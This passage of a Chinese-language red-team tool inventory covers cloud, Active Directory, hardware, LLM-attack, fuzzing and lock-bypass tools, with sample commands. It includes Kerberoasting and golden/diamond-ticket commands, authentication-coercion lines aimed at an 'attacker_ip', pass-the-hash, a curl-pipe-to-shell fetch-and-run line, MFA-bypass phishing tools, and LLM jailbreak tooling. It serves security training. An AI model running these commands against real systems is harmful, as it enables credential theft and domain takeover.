| **CloudFox** (BishopFox) | `OSS` | https://github.com/BishopFox/cloudfox | 多云提权路径发现工具。`cloudfox aws -p profile-name all-checks` 会跨所有服务测绘潜在的提权路径。 |

---

### ☁️ Azure / Entra ID / M365

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **AzureHound** | `OSS` | https://github.com/BloodHoundAD/AzureHound | 面向 Azure/Entra ID 的 BloodHound 数据采集器。枚举用户、组、应用、服务主体与订阅。把 JSON 导入 BloodHound CE。 |
| **ROADtools** | `OSS` | https://github.com/dirkjanm/ROADtools (`pip3 install roadtools`) | Azure/Entra ID 枚举框架。`roadrecon gather` 枚举整个租户。`roadrecon-gui` 提供 Web 界面。M365 红队必备。 |
| **GraphRunner** | `OSS` | https://github.com/dafthack/GraphRunner | Microsoft 365 / Graph API 攻击自动化。通过 Teams 钓鱼、邮件搜索、文件外传、OAuth 滥用。`Invoke-GraphRunner -Tokens $tokens` |
| **TokenTacticsV2** | `OSS` | https://github.com/f-bader/TokenTacticsV2 | Azure 访问令牌操作。刷新令牌滥用、令牌范围操作、CAP 绕过。 |
| **AADInternals** | `OSS` | https://github.com/Gerenios/AADInternals (`Install-Module AADInternals` in PowerShell) | Azure AD PowerShell 攻击工具包。云上 DCSync、读取 AD Connect 凭据、租户枚举、令牌提取。 |
| **Stormspotter** | `OSS` | https://github.com/Azure/Stormspotter | 微软自家的 Azure 攻击图可视化工具。类似 BloodHound 的 Azure 路径。适合可视化复杂租户环境。 |

---

### ☁️ 多云与审计

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **ScoutSuite** | `OSS` | https://github.com/nccgroup/ScoutSuite (`pip3 install scoutsuite`) | 多云安全审计：AWS、Azure、GCP、Alibaba、Oracle。`scout aws` 审计 AWS 账户的错误配置并生成 HTML 报告。 |
| **Prowler** | `OSS` | https://github.com/prowler-cloud/prowler (`pip3 install prowler`) | AWS/Azure/GCP 的 CIS 基准与安全合规检查。300 多项检查。在持续审计场景下比 ScoutSuite 更快。`prowler aws` |
| **Stratus Red Team** (DataDog) | `OSS` | https://github.com/DataDog/stratus-red-team (`go install github.com/DataDog/stratus-red-team/v2/cmd/stratus@latest`) | 云攻击模拟：以代码形式表达 TTP。`stratus list` 列出所有可用 TTP，`stratus detonate aws.exfiltration.s3-backdoor-bucket-policy` 模拟攻击以测试检测。 |
| **CDK** | `OSS` | https://github.com/cdk-team/CDK | 容器逃逸与后渗透。自动检测容器错误配置。`cdk eva` 做环境评估，`cdk run docker-sock-check` 检查 Docker socket 逃逸。 |
| **deepce** | `OSS` | https://github.com/stealthcopter/deepce | Docker 提权枚举。`./deepce.sh` 自动寻找容器逃逸路径。 |

---

### 🎣 AiTM 钓鱼

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **Evilginx3** | `OSS` | https://github.com/kgretzky/evilginx2 | 反向代理钓鱼框架。代理真实登录页面，捕获会话 cookie（绕过 MFA）。**请使用 Evilginx3（最新版本）。** 提供 Microsoft、Google、Okta 等几十个服务的 phishlet。 |
| **GoPhish** | `OSS` | https://github.com/gophish/gophish | 钓鱼活动管理。邮件发送、落地页、跟踪。与 Evilginx3 集成：GoPhish 负责发信，Evilginx3 负责落地页。 |

---

<a id="phase-4g-hardware"></a>
## 阶段 4G：硬件、SDR 与嵌入式

---

### 🔧 硬件接口工具

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **OpenOCD** | `OSS` | https://openocd.org (`sudo apt install openocd`) | 开源 JTAG/SWD 接口工具。连接嵌入式设备的调试端口。设置断点、转储内存、暂停 CPU。`openocd -f interface/jlink.cfg -f target/stm32f4x.cfg` |
| **Glasgow Interface Explorer** | `FREE`（硬件约 $150） | https://glasgow-embedded.org | 现代多协议硬件接口工具（JTAG、SPI、I2C、UART、1-Wire 等）。基于可编程 FPGA。在现代硬件研究上比 Bus Pirate 能力更强。强烈建议用它替代 Bus Pirate。 |
| **Bus Pirate** | `FREE`（硬件约 $30） | http://dangerousprototypes.com/docs/Bus_Pirate | 经典的多协议硬件调试工具。较老但文档丰富。SPI、I2C、UART、1-Wire。在升级到 Glasgow 之前是不错的起点。 |
| **sigrok / PulseView** | `OSS` | https://sigrok.org/wiki/PulseView (`sudo apt install sigrok pulseview`) | 带 200 多个协议解码器的逻辑分析仪软件。可配合廉价（约 $10）的 USB 逻辑分析仪使用。采集并解码硬件上的 SPI、I2C、UART 信号。理解目标协议必备。 |
| **flashrom** | `OSS` | `sudo apt install flashrom` | 读取、写入并校验 SPI 闪存固件芯片。支持硬件编程器。`flashrom -p ch341a_spi -r firmware.bin` 从路由器/设备芯片中转储固件。 |
| **binwalk** | `OSS` | `sudo apt install binwalk` | 固件提取与分析。`binwalk -eM firmware.bin` 递归提取所有检测到的文件系统与可执行文件。每次固件分析的起点。 |
| **PCILeech** | `OSS` | https://github.com/ufrisk/pcileech | 使用 PCIe 硬件或 USB3380 的 DMA（直接内存访问）攻击框架。无需软件 agent 即可读写目标系统的物理内存。内存取证与在线系统分析的利器。 |

---

### 📻 SDR（软件定义无线电）

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **RTL-SDR** | `FREE`（硬件约 $25） | https://www.rtl-sdr.com | 廉价的仅接收 SDR 接收器。支持 24–1766 MHz。适合作为 RF 分析的起点：解码流量、分析信号、测试频谱。 |
| **HackRF One** | `COMMERCIAL`（约 $350） | https://greatscottgadgets.com/hackrf/ | 全双工（发射 + 接收）SDR。1 MHz – 6 GHz。发射类攻击（重放、干扰）必需。用 `hackrf_transfer` 做原始 I/Q 采集。 |
| **GNURadio** | `OSS` | https://www.gnuradio.org (`sudo apt install gnuradio`) | 面向 SDR 的信号处理框架。可视化或用 Python 搭建信号处理流图。解调、分析并发射任意信号。 |

---

### 🚗 蓝牙、BLE 与汽车

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Bleak** | `OSS` | https://github.com/hbldh/bleak (`pip3 install bleak`) | Python BLE 库。跨平台（Windows/Linux/macOS）。扫描、连接、读特征值、写入 BLE 设备。所有 BLE 脚本的基础。 |
| **Mirage (BLE)** | `OSS` | https://github.com/RCayre/mirage | 聚焦 BLE 的无线协议攻击框架。MITM 攻击、数据包注入、嗅探。比 Bleak 更偏攻击。 |
| **Btlejuice** | `OSS` | https://github.com/DigitalSecurity/btlejuice | BLE MITM 框架。需要两个 BLE 适配器。实时拦截并修改设备与手机之间的 BLE 流量。 |
| **Wireshark (BT plugin)** | `OSS` | `sudo apt install wireshark` | 蓝牙与 BLE 抓包分析。在 Linux 上配合 `hcidump` 或内置蓝牙抓包使用。 |
| **python-can** | `OSS` | https://python-can.readthedocs.io (`pip3 install python-can`) | CAN 总线接口库。支持 SocketCAN、USB CAN 分析仪、OBD-II 适配器。汽车攻击脚本的基础。 |
| **caringcaribou** | `OSS` | https://github.com/CaringCaribou/caringcaribou | 汽车安全工具。CAN 总线模糊测试、UDS（统一诊断服务）扫描、DCM（诊断通信管理）攻击。`caringcaribou uds discovery` 扫描 ECU。 |
| **can-utils** | `OSS` | `sudo apt install can-utils` | SocketCAN 用户态工具集。`candump can0` 嗅探 CAN 流量。`cansend can0 7DF#0201050000000000` 发送 OBD-II 请求。 |

---

### 🏭 ICS / SCADA

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **pymodbus** | `OSS` | `pip3 install pymodbus` | Modbus 协议测试库。读写线圈与寄存器。测试支持 Modbus 的 PLC 与工业设备。 |
| **Redpoint** (Nmap scripts) | `OSS` | https://github.com/digitalbond/Redpoint | 用于 ICS/SCADA 设备指纹识别与漏洞检查的 Nmap NSE 脚本。`nmap --script redpoint -p 102 target` 针对 Siemens S7。 |

---

<a id="phase-4h-supply-chain"></a>
## 阶段 4H：供应链

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Trufflehog 3.x** | `OSS` | https://github.com/trufflesecurity/trufflehog (`go install github.com/trufflesecurity/trufflehog/v3@latest`) | 密钥扫描：git 仓库、S3 桶、Docker 镜像、CI/CD 配置。找出经过验证的真实密钥（AWS 密钥、GitHub 令牌、Stripe 密钥）。`trufflehog git https://github.com/target/repo` |
| **Semgrep** | `OSS` | https://semgrep.dev (`pip3 install semgrep`) | 用于在源码中查找安全模式的静态分析。`semgrep --config=p/security-audit ./codebase` 对代码运行安全规则。 |
| **CDK** | `OSS` | https://github.com/cdk-team/CDK | 当供应链攻击最终落在容器中时，用于容器逃逸与后渗透。 |
| **deepce** | `OSS` | https://github.com/stealthcopter/deepce | 落在容器中后用于 Docker 提权枚举。 |
| **crxcavator** | `FREE`（网页） | https://crxcavator.io | Chrome 扩展风险分析。评估扩展权限、内容安全策略与风险评分。用于浏览器扩展供应链研究。 |
| **retire.js** | `OSS` | `npm install -g retire` | 扫描 Web 项目中使用的已知有漏洞的 JavaScript 库。`retire --js` 扫描 JavaScript 文件。 |
| **SolarWinds Research** (reference) | `FREE` | https://github.com/fireeye/sunburst_countermeasures | Mandiant 就 SolarWinds SUNBURST 攻击发布的 IOC。把它作为供应链攻击的经典参考来研究。 |

---

<a id="phase-4i-ad"></a>
## 阶段 4I：Active Directory 与身份

> 这是条目最多的一节，因为真实项目中 AD 攻击是从初始访问到域控沦陷最常见的路径。本节每个工具都要学。

---

### 🗺️ AD 枚举与关系图

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **BloodHound CE** | `OSS` | https://github.com/SpecterOps/BloodHound | AD 攻击路径可视化。导入 SharpHound/AzureHound 数据。运行 Neo4j 查询以找出通往域管、DCSync 权限与可 Kerberoast 的路径。`Shortest Paths to Domain Admins` 是你的第一条查询。 |
| **SharpHound CE** | `OSS` | https://github.com/SpecterOps/SharpHound | BloodHound CE 的数据采集器（.NET）。采集用户、组、ACL、GPO、信任关系与会话。`SharpHound.exe -c All --outputdirectory C:\Temp\` |
| **ldapdomaindump** | `OSS` | `pip3 install ldapdomaindump` | 通过 LDAP 把 AD 域信息转储为 HTML 与 JSON。适合快速获得可视化概览。`ldapdomaindump -u DOMAIN\\user -p password ldap://DC_IP` |
| **ldeep** | `OSS` | https://github.com/franc-pentest/ldeep (`pip3 install ldeep`) | LDAP 枚举工具。无需 SharpHound 即可枚举用户、组、计算机、GPO、ACL 与信任关系。若开启了匿名绑定，甚至可在未认证状态下工作。`ldeep ldap -u user -p pass -d domain -s ldap://DC users` |
| **enum4linux-ng** | `OSS` | https://github.com/cddmp/enum4linux-ng (`pip3 install enum4linux-ng`) | enum4linux 的 SMB/LDAP 枚举重写版。输出更好，误报更少。`enum4linux-ng -A DC_IP` 跑全部检查。 |

---

### ⚔️ AD 核心攻击工具集

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Impacket** | `OSS` | https://github.com/fortra/impacket (`pip3 install impacket`) | 用于 Windows 协议的 Python 库。你会反复用到的脚本：`GetNPUsers.py`（AS-REP roasting）、`GetSPNs.py`（Kerberoasting）、`secretsdump.py`（DCSync）、`ntlmrelayx.py`、`psexec.py`、`wmiexec.py`、`smbexec.py`。 |
| **NetExec (nxc)** | `OSS` | https://github.com/Pennyw0rth/NetExec (`pip3 install netexec`) | **CrackMapExec 的继任者：用它，不要用 CME。** SMB/WinRM/LDAP/SSH/MSSQL/RDP 枚举与利用。`nxc smb 192.168.1.0/24 -u user -p pass --shares` |
| **Rubeus** | `OSS` | https://github.com/GhostPack/Rubeus | **Kerberos 攻击的主力工具。** Kerberoasting、AS-REP roasting、金票/银票/钻石票据攻击、票据传递、哈希传递升级（Overpass-the-Hash）、S4U 滥用、非约束委派利用。`Rubeus.exe kerberoast /outfile:hashes.txt` —— 你会反复用到它。 |
| **evil-winrm** | `OSS` | https://github.com/Hackplayers/evil-winrm (`gem install evil-winrm`) | WinRM 利用 shell。上传下载文件、运行 PowerShell、支持哈希传递。`evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH` |
| **Responder** | `OSS` | `sudo apt install responder` | 投毒 LLMNR/NBT-NS/MDNS 以捕获 NTLMv2 哈希。与 ntlmrelayx 配合可做中继攻击。`sudo responder -I eth0 -wdv` |

> 💡 **新手提示（Rubeus）：** Rubeus 是 Kerberos 攻击的核心。速查：
> ```bash
> # Kerberoasting —— 为服务账户申请 TGS，离线破解
> Rubeus.exe kerberoast /outfile:hashes.txt
>
> # AS-REP Roasting —— 无需预认证的账户
> Rubeus.exe asreproast /outfile:asrep_hashes.txt
>
> # 票据传递（Pass-the-Ticket）—— 把 .kirbi 票据注入你的会话
> Rubeus.exe ptt /ticket:base64encodedticket
>
> # 金票 —— 伪造域票据（需要 krbtgt 哈希）
> Rubeus.exe golden /user:admin /domain:lab.local /sid:S-1-5-... /rc4:KRBTGT_HASH
>
> # 钻石票据 —— 比金票更真实（申请真实 TGT 后修改它）
> Rubeus.exe diamond /tgtdeleg /ticketuser:admin /ticketuserid:500 /groups:512 /krbkey:AES256KEY /createnetonly:C:\Windows\System32\cmd.exe /show
> ```

---

### 🏆 ADCS：证书攻击

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Certipy** | `OSS` | https://github.com/ly4k/Certipy (`pip3 install certipy-ad`) | ADCS 枚举与利用。发现并利用 ESC1–ESC15 错误配置。`certipy find -u user -p pass -dc-ip DC_IP -stdout` 做枚举。`certipy req -u user -p pass -dc-ip DC_IP -ca CA_NAME -template VulnerableTemplate` 做利用。 |
| **Certify** | `OSS` | https://github.com/GhostPack/Certify | .NET ADCS 枚举工具（GhostPack 的原始工具）。`Certify.exe find /vulnerable` 找出配置错误的模板。与 Certipy 配合使用。 |
| **PKINITtools** | `OSS` | https://github.com/dirkjanm/PKINITtools (`pip3 install impacket` + clone) | 用于 PKINIT Kerberos 认证的 Python 工具。通过 Certipy 拿到证书后，用它换取 Kerberos TGT。`gettgtpkinit.py -cert-pfx cert.pfx -dc-ip DC_IP domain/user tgt.ccache` |

> 💡 **新手提示（ADCS）：** Active Directory 证书服务是现代 AD 中影响最大的攻击面之一。ESC1（模板配置错误，允许任意 SAN）最常见。完整攻击链：`certipy find -vulnerable` → 定位 ESC1 模板 → 用任意 SAN 为域管执行 `certipy req` → `certipy auth` 取得域管的 NTLM 哈希 → DCSync。

---

### 🔐 Shadow Credentials 与 LAPS

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **Whisker** | `OSS` | https://github.com/eladshamir/Whisker | Shadow Credentials 攻击（.NET）。为目标账户添加 `msDS-KeyCredentialLink` 属性，并生成可用于认证的证书。`Whisker.exe add /target:targetUser` |
| **pyWhisker** | `OSS` | https://github.com/ShutdownRepo/pyWhisker (`pip3 install pywhisker`) | Whisker 的 Python 实现。可在 Linux 上使用。`pywhisker.py -d domain -u user -p pass --target targetUser --action add` |
| **BloodyAD** | `OSS` | https://github.com/CravateRouge/bloodyAD (`pip3 install bloodyAD`) | AD ACL 滥用工具包。直接执行 BloodHound 中的攻击路径。`bloodyAD --host DC_IP -d domain -u user -p pass add genericAll targetUser` —— 自动化基于 ACL 的提权。 |

---

### 🎯 认证强制

| 工具 | 许可证 | 链接 | 功能说明 |
|------|---------|------|--------------|
| **Coercer** | `OSS` | https://github.com/p0dalirius/Coercer (`pip3 install coercer`) | 用 30 多种方法（PetitPotam、DFSCoerce、ShadowCoerce 等）自动化认证强制。`coercer coerce -u user -p pass -d domain -l attacker_ip -t DC_IP` |
| **PetitPotam** | `OSS` | https://github.com/topotam/PetitPotam | 通过 MS-EFSRPC 强制 Windows 主机发起认证。与 ntlmrelayx 配合，把 NTLM 中继到 LDAP/ADCS。`python3 PetitPotam.py -u user -p pass attacker_ip DC_IP` |
| **DFSCoerce** | `OSS` | https://github.com/Wh04m1001/DFSCoerce | 通过 MS-DFSNM 协议强制认证。在 PetitPotam 已被封堵的已打补丁系统上仍然可用。 |

---

### 📋 后渗透

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **LinPEAS** | `OSS` | https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS | Linux 提权枚举脚本。按危险程度给输出着色。`curl -L https://linpeas.sh | sh`（或先下载再执行，不要直接用管道运行未知脚本）。 |
| **WinPEAS** | `OSS` | https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS | Windows 提权枚举。`winpeas.exe` —— 红色表示高危提权路径。 |
| **SharpUp** | `OSS` | https://github.com/GhostPack/SharpUp | Windows 本地提权检查（.NET）。检查服务配置错误、可修改的二进制、令牌特权与 DLL 劫持路径。 |
| **PowerView** (PowerSploit) | `OSS` | https://github.com/PowerShellMafia/PowerSploit | AD 枚举与利用 PowerShell 套件。`Get-DomainUser`、`Get-DomainGroupMember`、`Get-DomainTrust`、`Invoke-Kerberoast`。较老，但与 BloodHound 配合仍然有用。 |
| **GTFOBins** | `FREE`（网页） | https://gtfobins.github.io | 可用于提权、文件读写、SUID 滥用的 Unix 二进制速查。收藏它。 |
| **LOLBAS** | `FREE`（网页） | https://lolbas-project.github.io | Windows “Living off the Land” 二进制。可代理执行、绕过 AppLocker 或实施后渗透的合法 Windows 工具。 |

---

<a id="ai-llm-attack-surface"></a>
## AI / LLM 攻击面

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Garak** | `OSS` | https://github.com/leondz/garak (`pip3 install garak`) | LLM 漏洞扫描器。测试提示注入、越狱、数据泄漏、幻觉，以及 100 多项其他探针。`python3 -m garak --model_type openai --model_name gpt-4 --probes all` |
| **PyRIT** (Microsoft) | `OSS` | https://github.com/Azure/PyRIT (`pip3 install pyrit`) | 面向 AI 的 Python 红队接口。对 LLM 进行自动化多轮攻击。编排针对已部署 AI 系统的攻击流程。 |
| **promptbench** (Microsoft) | `OSS` | https://github.com/microsoft/promptbench (`pip3 install promptbench`) | 面向 LLM 的对抗性提示鲁棒性测试。衡量模型抵御对抗输入的能力。 |
| **TextFooler** | `OSS` | https://github.com/jind11/TextFooler | 面向 NLP 模型的对抗文本生成。生成语义相似但经过对抗扰动、能骗过分类器与 LLM 的输入。 |
| **LLM-Attacks** | `OSS` | https://github.com/llm-attacks/llm-attacks | 针对对齐后 LLM 的通用对抗攻击（Zou 等，2023）。贪心坐标梯度（GCG）攻击的研究实现。 |

---

<a id="phase-5-greatest"></a>
## 阶段 5：GREATEST —— 漏洞研究与 0-Day 挖掘

> **阶段 5 不是高级渗透测试。它是从操作者到原创者的转变。**
> 你不去运行别人写好的漏洞利用；你挖掘新的漏洞类别、逆向未公开的子系统、搭建自动化研究框架，并从原始崩溃中写出武器化的概念验证。

---

### 🧭 漏洞研究与模糊测试架构

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Tools_Inventory/3._Vulnerability_Research_&_Fuzzing_Architecture.png" alt="漏洞研究与模糊测试架构" width="1100"/>

</td></tr></table>
</div>

---

### 🔬 高级内核与虚拟机监控器研究

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **QEMU / KVM** | `OSS` | `sudo apt install qemu-kvm qemu-system-x86` | 带 GDB 远程调试桩（`-s -S`）的完整系统模拟。可启动自定义 Linux 内核或虚拟机监控器，并把 GDB 直接挂到 ring 0。 |
| **Buildroot** | `OSS` | https://buildroot.org | 极简嵌入式 Linux 系统生成器。可构建 10MB 的根文件系统，2 秒内启动，用于高吞吐的内核模糊测试与驱动探索。 |
| **WinDbg Preview (KDNET)** | `FREE` | Microsoft Store | 支持高速网络调试的 Windows 内核调试器。检视 `ntoskrnl` 结构、设置内核断点、分析蓝屏检查（`!analyze -v`）。 |
| **VirtualKD-Redux** | `OSS` | https://github.com/4d61726b/VirtualKD-Redux | 面向 VMware 与 VirtualBox 的加速内核调试代理。用直接内存管道替代缓慢的虚拟 COM 端口，实现响应迅速的在线调试。 |
| **kAFL / Nyx** | `OSS` | https://github.com/IntelLabs/kAFL | 硬件辅助（Intel PT）的虚拟机监控器级快照模糊测试器。可对完整操作系统内核、Windows 驱动与 UEFI 固件做模糊测试，每秒执行数千次。 |
| **bpftool / bcc** | `OSS` | `sudo apt install bpfcc-tools linux-tools-common` | eBPF 检视工具与 BPF 编译器合集。审计 eBPF 程序、探查校验器状态、研究 eBPF JIT 编译器的 bug 类别。 |

---

### 🎰 现代覆盖率引导与专用模糊测试

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **AFL++ (Persistent Mode)** | `OSS` | https://github.com/AFLplusplus/AFLplusplus | 领先的覆盖率引导遗传模糊测试器。使用进程内持久模式（`__AFL_LOOP`）相比标准 fork-and-exec 模糊测试可获得 10–100 倍的执行速度。 |
| **libFuzzer** | `OSS` | 内置于 Clang / LLVM（`-fsanitize=fuzzer,address`） | 面向库的进程内模糊测试器。把变异的字节数组直接喂给目标 API 函数，零进程创建开销。 |
| **Honggfuzz** | `OSS` | https://github.com/google/honggfuzz | Google 的覆盖率模糊测试器，利用硬件分支计数器（Intel PT）与 Linux perf。擅长多线程应用与基于 socket 的网络服务。 |
| **Syzkaller** | `OSS` | https://github.com/google/syzkaller | Google 的自主 Linux 与 Windows 内核系统调用模糊测试器。使用声明式系统调用定义（`sys/`）与 KCOV，发现深层操作系统提权。 |
| **Fuzzilli** | `OSS` | https://github.com/googleprojectzero/fuzzilli | Google Project Zero 的 JavaScript 引擎模糊测试器。生成语义合法的 JavaScript AST，触发 V8（Chrome）、JavaScriptCore（Safari）与 SpiderMonkey（Firefox）中的优化 bug。 |
| **Boofuzz** | `OSS` | https://github.com/jtpereyda/boofuzz (`pip3 install boofuzz`) | 继任 Sulley 的网络协议模糊测试器。编写复杂的有状态客户端-服务端交互、变异数据包字段、监控服务的未处理异常。 |

> 💡 **新手提示（持久模式模糊测试）：**
> 标准模糊测试对每个测试用例都 fork 一个目标进程，产生巨大的 CPU 开销。持久模式让进程常驻，并围绕解析函数循环：
> ```c
> #include <stdint.h>
> #include <unistd.h>
>
> // 目标解析函数
> int parse_payload(const uint8_t *data, size_t size);
>
> __AFL_FUZZ_INIT();
>
> int main(void) {
>     #ifdef __AFL_HAVE_MANUAL_CONTROL
>     __AFL_INIT();
>     #endif
>
>     unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;
>
>     while (__AFL_LOOP(100000)) {
>         size_t len = __AFL_FUZZ_TESTCASE_LEN;
>         parse_payload(buf, len);
>     }
>     return 0;
> }
> ```
> 用 `afl-clang-fast -O2 -fsanitize=address harness.c -o harness` 编译，再用 `afl-fuzz -i in/ -o out/ -- ./harness` 做模糊测试。

---

### 🛡️ 运行时检测器与覆盖率插桩

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **AddressSanitizer (ASAN)** | `OSS` | 内置于 Clang/GCC（`-fsanitize=address`） | 编译期插桩，捕获内存安全违规：堆/栈缓冲区溢出、释放后使用、双重释放，在崩溃发生时立即报出。 |
| **UndefinedBehaviorSanitizer (UBSan)** | `OSS` | 内置于 Clang/GCC（`-fsanitize=undefined`） | 检测未定义的 C/C++ 语义：有符号整数溢出、空指针解引用、整数截断与非法位移。 |
| **MemorySanitizer (MSAN)** | `OSS` | 内置于 Clang（`-fsanitize=memory`） | 检测对未初始化的栈或堆内存的读取，避免其造成静默的逻辑错误。要求所有库都已插桩。 |
| **ThreadSanitizer (TSAN)** | `OSS` | 内置于 Clang/GCC（`-fsanitize=thread`） | 检测复杂多线程原生二进制中的数据竞争、线程死锁与同步 bug。 |
| **KASAN & KCOV** | `OSS` | Linux Kernel (`CONFIG_KASAN=y`, `CONFIG_KCOV=y`) | 内置于自定义 Linux 内核的内核地址检测器与内核覆盖率插桩，用于配合 Syzkaller 做模糊测试。 |
| **lcov / genhtml** | `OSS` | `sudo apt install lcov` | 覆盖率分析套件，可把 GCC/Clang 的覆盖率数据（`.gcda`/`.gcno`）转换为详细的 HTML 报告，显示未被覆盖的代码块。 |

---

### 🔀 补丁差分与语义变体分析

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **BinDiff 9** | `FREE` | https://github.com/google/bindiff/releases | 由 Google/Zynamics 出品的行业标准二进制比对工具。比对来自 Ghidra 与 IDA Pro 的已打补丁/未打补丁二进制，定位静默的安全修复。 |
| **Diaphora** | `OSS` | https://github.com/joxeankoret/diaphora | 面向 Ghidra 与 IDA Pro 的最先进的开源二进制差分插件。采用多种 AST 与启发式匹配算法。 |
| **CodeQL CLI** | `OSS` | https://github.com/github/codeql-cli-binaries | 语义代码分析引擎。把源码当作关系数据库来查询，在企业级规模上发现复杂的漏洞模式与结构性 bug。 |
| **Semgrep** | `OSS` | https://github.com/semgrep/semgrep (`pip3 install semgrep`) | 用于审计源码树的快速 AST 模式匹配引擎。编写自定义语义模式，在多个仓库中查找零日变体。 |

---

### 🧠 确定性调试与漏洞利用开发

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **rr (Mozilla)** | `OSS` | https://rr-project.org (`sudo apt install rr`) | 面向 x86 Linux 的记录-重放调试器。把非确定性的崩溃或竞争条件录制一次，然后以反向执行（`reverse-step`、`reverse-continue`）完全一致地重放。 |
| **pwndbg** | `OSS` | https://github.com/pwndbg/pwndbg | 二进制漏洞利用领域事实上的 GDB 扩展。可视化栈帧、寄存器与 glibc 堆分配（`heap`、`bins`、`vis_heap_chunks`）。 |
| **angr** | `OSS` | https://angr.io (`pip3 install angr`) | 多架构 Python 二进制分析平台。结合静态分析与符号执行，求解复杂路径约束并绕过保护逻辑。 |
| **KLEE** | `OSS` | https://klee.github.io | 基于 LLVM 的符号执行引擎，可同时执行每一条可达的程序路径，生成高覆盖率的测试用例并触发崩溃。 |
| **Triton** | `OSS` | https://triton-library.github.io | 动态二进制分析库，提供动态污点分析（DTA）、符号执行以及 x86/ARM 指令的 AST 表示。 |

---

### 🌐 浏览器引擎与 JIT 研究

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **d8 (V8 Debug Shell)** | `OSS` | 自行构建：https://v8.dev/docs/build | Chrome V8 JavaScript 引擎的调试构建 shell。用 `--allow-natives-syntax` 与 `--trace-opt` 运行，可检视 JIT 编译图并验证类型混淆原语。 |
| **jsc (JavaScriptCore Shell)** | `OSS` | 从 WebKit 源码树自行构建 | Apple Safari 的 JavaScriptCore 引擎的独立命令行 shell。测试 DFG/FTL JIT 优化与结构体 ID 破坏必备。 |
| **wabt** | `OSS` | https://github.com/WebAssembly/wabt (`sudo apt install wabt`) | WebAssembly 二进制工具包，包含 `wasm-decompile`、`wasm2wat` 与 `wasm-validate`，用于审计 WASM 运行时与 JIT 分层。 |
| **SpiderMonkey Shell (js)** | `OSS` | 从 Mozilla 源码树自行构建 | Mozilla Firefox 的 SpiderMonkey 引擎的独立命令行 JavaScript shell。差分模糊测试与审计 WarpMonkey/IonMonkey JIT 分层必备。 |
| **Chromium depot_tools** | `OSS` | https://chromium.googlesource.com/chromium/tools/depot_tools.git | Google 官方工具链（fetch、gclient、gn、ninja），用于检出、配置并编译 V8 与 Chromium 的 AddressSanitizer 调试构建。 |

---

### 📱 移动端与 Apple Silicon 研究（iOS / ARM64e）

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **ipsw** | `OSS` | https://github.com/blacktop/ipsw | 基于 Go 的命令行工具，用于搜索、下载、提取并差分 Apple IPSW 固件文件、内核缓存与 Mach-O 二进制。 |
| **img4tool** | `OSS` | https://github.com/tihmstar/img4tool | 用于解析、解密并提取 Apple Img4 容器格式与 iOS 启动组件的工具。 |
| **apfs-fuse** | `OSS` | https://github.com/sgan81/apfs-fuse | FUSE 驱动，可直接在 Linux 研究工作站上以只读方式挂载 Apple 文件系统（APFS）镜像。 |
| **chisel** | `OSS` | https://github.com/facebook/chisel | LLDB 命令与调试扩展合集，用于加速 iOS 与 macOS 二进制逆向与运行时检视。 |
| **Corellium** | `COMMERCIAL` | https://www.corellium.com | 硬件级精确的虚拟化 ARM 平台，用于 iOS 与 Android 内核研究、在线调试与漏洞利用验证。 |

---

<a id="phase-6-special-operations"></a>
## 阶段 6：特种行动 —— 物理、社会与量子

> **阶段 6 走出屏幕之外。**
> 真正的对抗性作业手法会打通数字与物理领域：撬锁、复制凭据、安放隐蔽投放盒、操纵人的决策回路、应对后量子密码迁移，以及执行完整的红队项目。

---

### 🔓 物理红队 —— 开锁绕过与隐蔽进入

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Sparrows / Multipick Lockpick Sets** | `COMMERCIAL`（约 $40-$150） | https://www.sparrowslockpicks.com / https://shop.multipick.com | 专业不锈钢开锁套装：钩形拨片（短、中、陡）、菱形拨片、bogota 梳齿拨片，以及 TOK（keyway 顶部）扁平撬杆。 |
| **Covert Instruments Companion / Genesis** | `COMMERCIAL`（约 $35-$90） | https://covertinstruments.com | 为外勤作业人员与隐蔽进入绕过设计的超紧凑 EDC 开锁工具。 |
| **Bump Keys & Bump Hammer** | `COMMERCIAL`（约 $30） | 专业锁匠供应商 | 用于 Schlage（SC1/SC4）、Kwikset（KW1）与 Yale 的 999 深度精密铣削撞匙，配一把加重聚合物撞锤，用于以动能破开弹子锁芯。 |
| **Impressioning Kit** | `COMMERCIAL`（约 $50） | 专业锁匠供应商 | 瑞士 #4 刃口 pippin 锉、精密台钳、10 倍光学放大镜，以及黄铜钥匙坯，用于依据锁芯弹子痕迹做出可用的实体钥匙。 |
